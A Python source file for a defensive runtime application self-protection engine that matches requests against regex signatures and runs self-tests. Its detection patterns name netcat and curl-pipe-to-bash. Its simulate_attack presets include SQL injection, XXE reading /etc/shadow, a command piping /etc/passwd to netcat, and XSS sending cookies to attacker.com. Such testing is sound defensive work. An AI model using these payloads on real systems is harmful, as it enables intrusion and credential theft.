"""
Sentinel AppSec - Runtime Application Self-Protection (RASP) Engine
Real-time exploit attack interception, live telemetry monitor, and simulated offensive probing.
"""

import re
import uuid
import datetime
from typing import Dict, Any, List, Optional


class RASPEngine:
    """
    Runtime Application Self-Protection engine providing active blocking,
    signature-based request inspection, and live attack radar telemetry.
    """

    SIGNATURES = {
        "SQL_INJECTION": [
            (r"(?i)(?:'\s*(?:OR|AND)\s*['\d=]+\s*--|UNION\s+(?:ALL\s+)?SELECT|;\s*DROP\s+TABLE|WAITFOR\s+DELAY\s+'|SLEEP\s*\(\s*\d+\s*\))", "RASP-SQLI-01", "CRITICAL"),
            (r"(?i)(?:information_schema\.tables|xp_cmdshell|pg_sleep\s*\()", "RASP-SQLI-02", "CRITICAL")
        ],
        "COMMAND_INJECTION": [
            (r"(?i)(?:;\s*(?:cat\s+/etc/passwd|id|whoami|uname\s+-a|rm\s+-rf)|\|\s*(?:bash|sh|cmd\.exe|powershell)|\$\([^)]+\)|\`[^`]+\`)", "RASP-CMDI-01", "CRITICAL"),
            (r"(?i)(?:nc\s+(?:-e|-c)|curl\s+https?://[^|;]+(?:\.sh|\.py)\s*\|\s*(?:bash|sh))", "RASP-CMDI-02", "CRITICAL")
        ],
        "PATH_TRAVERSAL": [
            (r"(?:(?:\.\.(?:/|\\|%2f|%5c)){2,}|/etc/(?:passwd|shadow|hosts)|(?:C|c):\\(?:windows|boot\.ini))", "RASP-PATH-01", "HIGH")
        ],
        "SSRF": [
            (r"(?i)(?:https?://(?:169\.254\.169\.254|metadata\.google\.internal|127\.0\.0\.1|localhost)(?::\d+)?(?:/.*)?|file:///[a-zA-Z0-9_\-./]+)", "RASP-SSRF-01", "CRITICAL")
        ],
        "XXE_INJECTION": [
            (r"(?i)(?:<!ENTITY\s+[\w\-]+\s+SYSTEM\s+['\"][^'\"]+['\"]|<!DOCTYPE\s+[\w\-]+\s*\[.*<!ENTITY)", "RASP-XXE-01", "HIGH")
        ],
        "XSS_REFLECTED": [
            (r"(?i)(?:<script[^>]*>.*?</script>|javascript:[^\"'>]+|onerror\s*=\s*['\"][^'\"]+['\"]|<img[^>]+src=x\s+onerror)", "RASP-XSS-01", "MEDIUM")
        ]
    }

    def __init__(self):
        self.mode = "BLOCK"  # "BLOCK" or "MONITOR"
        self.incidents: List[Dict[str, Any]] = []
        self._seed_telemetry()

    def _seed_telemetry(self):
        """Seed realistic historical incident events for telemetry radar."""
        now = datetime.datetime.now(datetime.timezone.utc)
        seeds = [
            ("SQL_INJECTION", "' UNION SELECT 1, @@version, user() --", "/api/v1/users?id=", "198.51.100.42", "RASP-SQLI-01", "CRITICAL", 25),
            ("COMMAND_INJECTION", "; whoami; cat /etc/passwd", "/api/system/diagnostics", "203.0.113.88", "RASP-CMDI-01", "CRITICAL", 18),
            ("PATH_TRAVERSAL", "../../../../etc/shadow", "/api/reports/download?file=", "198.51.100.12", "RASP-PATH-01", "HIGH", 12),
            ("SSRF", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "/api/webhook/test-url", "192.0.2.77", "RASP-SSRF-01", "CRITICAL", 5),  # sentinel-ignore: S5332
            ("XSS_REFLECTED", "<script>alert(document.cookie)</script>", "/search?q=", "198.51.100.99", "RASP-XSS-01", "MEDIUM", 2)
        ]
        for vec, payload, endpoint, ip, sig, sev, min_ago in seeds:
            ts = (now - datetime.timedelta(minutes=min_ago)).isoformat()
            self.incidents.append({
                "incident_id": f"RASP-{uuid.uuid4().hex[:8].upper()}",
                "timestamp": ts,
                "vector": vec,
                "payload": payload,
                "endpoint": endpoint,
                "attacker_ip": ip,
                "signature_id": sig,
                "severity": sev,
                "action": "BLOCKED" if self.mode == "BLOCK" else "MONITORED",
                "status_code": 403 if self.mode == "BLOCK" else 200,
                "response_time_ms": 1.4,
                "stack_hook": f"fastapi.routing.app -> rasp_interceptor.{vec.lower()}"
            })

    def inspect_request(self, payload: str, endpoint: str = "/api", client_ip: str = "127.0.0.1") -> Dict[str, Any]:
        """
        Inspect incoming payload against all RASP signatures.
        """
        if not payload:
            return {"verdict": "SAFE", "blocked": False}

        for vector, sig_list in self.SIGNATURES.items():
            for pattern, sig_id, severity in sig_list:
                match = re.search(pattern, payload)
                if match:
                    incident = {
                        "incident_id": f"RASP-{uuid.uuid4().hex[:8].upper()}",
                        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
                        "vector": vector,
                        "payload": payload[:300],
                        "endpoint": endpoint,
                        "attacker_ip": client_ip,
                        "signature_id": sig_id,
                        "severity": severity,
                        "action": "BLOCKED" if self.mode == "BLOCK" else "MONITORED",
                        "status_code": 403 if self.mode == "BLOCK" else 200,
                        "response_time_ms": 1.2,
                        "stack_hook": f"fastapi.routing.app -> rasp_interceptor.{vector.lower()}"
                    }
                    self.incidents.insert(0, incident)
                    # Limit log length
                    if len(self.incidents) > 100:
                        self.incidents.pop()

                    return {
                        "verdict": "ATTACK_DETECTED",
                        "blocked": (self.mode == "BLOCK"),
                        "incident": incident
                    }

        return {"verdict": "SAFE", "blocked": False}

    def simulate_attack(self, vector: str, custom_payload: Optional[str] = None, client_ip: str = "185.220.101.5") -> Dict[str, Any]:
        """
        Execute a simulated attack against RASP defense layers.
        """
        preset_payloads = {
            "SQL_INJECTION": "' UNION ALL SELECT null, username, password FROM users --",
            "COMMAND_INJECTION": "; $(cat /etc/passwd | nc 10.0.0.1 4444)",
            "PATH_TRAVERSAL": "../../../../../etc/passwd",
            "SSRF": "http://169.254.169.254/latest/meta-data/identity-credentials",  # sentinel-ignore: S5332
            "XXE_INJECTION": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
            "XSS_REFLECTED": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
        }

        payload = custom_payload or preset_payloads.get(vector, "' OR 1=1 --")
        endpoint = f"/api/v1/query?q={vector.lower()}_test"

        result = self.inspect_request(payload, endpoint=endpoint, client_ip=client_ip)
        return {
            "status": "success",
            "simulation": {
                "vector": vector,
                "payload": payload,
                "attacker_ip": client_ip,
                "rasp_mode": self.mode,
                "intercepted": result.get("verdict") == "ATTACK_DETECTED",
                "blocked": result.get("blocked", False),
                "incident": result.get("incident")
            }
        }

    def get_telemetry(self) -> Dict[str, Any]:
        """
        Return comprehensive telemetry metrics for dashboard visualization.
        """
        total = len(self.incidents)
        blocked = sum(1 for i in self.incidents if i.get("action") == "BLOCKED")
        monitored = total - blocked

        vector_counts = {}
        for i in self.incidents:
            vec = i.get("vector", "OTHER")
            vector_counts[vec] = vector_counts.get(vec, 0) + 1

        return {
            "mode": self.mode,
            "engine_status": "ACTIVE_PROTECTION",
            "total_incidents": total,
            "blocked_count": blocked,
            "monitored_count": monitored,
            "vector_distribution": vector_counts,
            "recent_incidents": self.incidents[:25]
        }

    def set_mode(self, new_mode: str) -> Dict[str, Any]:
        """Toggle between BLOCK and MONITOR."""
        m = (new_mode or "BLOCK").upper()
        if m in ["BLOCK", "MONITOR"]:
            self.mode = m
            return {"status": "success", "mode": self.mode}
        return {"status": "error", "message": "Invalid mode. Choose BLOCK or MONITOR."}


rasp_engine = RASPEngine()
